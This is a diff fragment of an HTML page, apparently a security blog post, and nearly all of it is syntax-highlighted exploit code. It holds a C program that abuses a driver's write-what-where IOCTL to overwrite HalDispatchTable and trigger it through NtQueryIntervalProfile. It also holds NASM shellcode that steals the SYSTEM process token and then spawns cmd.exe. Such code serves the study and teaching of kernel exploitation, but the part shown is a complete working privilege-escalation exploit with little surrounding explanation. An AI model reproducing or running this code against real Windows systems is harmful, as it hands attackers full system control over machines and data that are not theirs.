+</span></span><span class="line"><span class="cl">    <span class="n">_NtQueryIntervalProfile</span> <span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">KeGetCurrentThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">wtf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">255</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">sizeofUsername</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Search address of notskrnl.exe...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ntoskrnl</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="s">&#34;ntoskrnl.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ntoskrnl</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Can&#39;t load ntoskrnl.exe</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntoskrnl</span><span class="p">,</span> <span class="s">&#34;HalDispatchTable&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">HalDispatchTable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Can&#39;t found HalDispatchTable in ntoskrnl.exe</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] HalDispatchTable in userland: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">kernelBase</span> <span class="o">=</span> <span class="n">getKernelBase</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">kernelBase</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Can&#39;t find the kernel base</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">HalDispatchTable</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">ntoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">kernelBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] HalDispatchTable in kernelland: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Search NtAllocateVirtualMemory...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtAllocateVirtualMemory</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">),</span> <span class="s">&#34;NtAllocateVirtualMemory&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Error with GetProcAddress : %.8x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Copy the shellcode...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="o">=</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">leetAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sizeofShellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">error</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Error with NtAllocateVirtualMemory : %.8x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span> <span class="c1">// Process PID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">leetAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Error with Createfile : %.8x.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">l33t</span><span class="p">.</span><span class="n">where</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">l33t</span><span class="p">.</span><span class="n">what</span> <span class="o">=</span> <span class="n">leetAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_WRIT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l33t</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">l33t</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">),</span> <span class="s">&#34;NtQueryIntervalProfile&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">NtQueryIntervalProfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Can&#39;t find NtQueryIntervalProfile</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Execute NtQueryIntervalProfile</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NtQueryIntervalProfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wtf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">GetUserNameA</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sizeofUsername</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] New username: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Modify HalDispatchTable+0x8 to point on KeGetCurrentThread</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">KeGetCurrentThread</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntoskrnl</span><span class="p">,</span> <span class="s">&#34;KeGetCurrentThread&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">KeGetCurrentThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Can&#39;t found KeGetCurrentThread in ntoskrnl.exe</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] KeGetCurrentThread in userland: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">KeGetCurrentThread</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">KeGetCurrentThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">KeGetCurrentThread</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">ntoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">kernelBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] KeGetCurrentThread in kernelland: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">KeGetCurrentThread</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">l33t</span><span class="p">.</span><span class="n">where</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">l33t</span><span class="p">.</span><span class="n">what</span> <span class="o">=</span> <span class="n">KeGetCurrentThread</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_WRIT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l33t</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">l33t</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Executing a new command console to test it...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">format</span> <span class="nv">PE64</span> <span class="nv">GUI</span> <span class="mf">4.0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">start:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">; We save the registers</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rbx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rcx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rdx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rdi</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="nb">rsi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">;--------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; 			Stack</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;--------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; RSP-8: EPROCESS+0x188 system</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;--------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; RSP-4: EPROCESS+0x188 exploit</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;--------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">gs</span><span class="p">:</span><span class="kt">qword</span> <span class="mh">0x188</span><span class="p">]</span>   <span class="c1">; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">]</span>       <span class="c1">; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x188</span>              <span class="c1">; +0x188 ActiveProcessLinks : _LIST_ENTRY</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rdx</span>                <span class="c1">; Our linked list \o/ We save the first structure</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">searchProcess:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rdx</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">]</span>        <span class="c1">; +0x180 UniqueProcessId</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x4</span>                <span class="c1">; SYSTEM PID</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">sysProcFound</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0x4141414141414141</span> <span class="c1">; Our exploit PID</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rcx</span>                <span class="c1">; cmp reg64, imm64 don&#39;t exist</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">exploitProcFound</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nl">nextProcess:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>              <span class="c1">; Next process (Flink)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rbx</span>                <span class="c1">; We are back at the starting point</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">retApp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nv">searchProcess</span>           <span class="c1">; We loop!</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nl">sysProcFound:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="nb">rdx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nb">al</span><span class="nv">lPIDFound</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nl">exploitProcFound:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">],</span> <span class="nb">rdx</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nl">allPIDFound:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">],</span> <span class="nb">rcx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">nextProcess</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="nb">rcx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">nextProcess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">; We copy the SYSTEM token</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rdi</span> <span class="c1">; Exploit</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rsi</span> <span class="c1">; System</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">]</span>       <span class="c1">; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="p">[</span><span class="nb">rdi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">],</span> <span class="nb">rax</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nl">retApp:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; Restore the registers</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rsi</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rdi</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rdx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rcx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rbx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span></code></pre></div>
   </article>
-</main>
+</section>
 
-
-    <footer id="footer" class="site-footer">
+    </div><footer id="footer" class="site-footer">
   <div class="copyright">
-    
-      <p>&copy; 2023 Dimitri Fourny</p>
-    
+      <p>&copy; 2024 Dimitri Fourny</p>
   </div>
-</footer>
-
-  </body>
-
+</footer></body>
 </html>
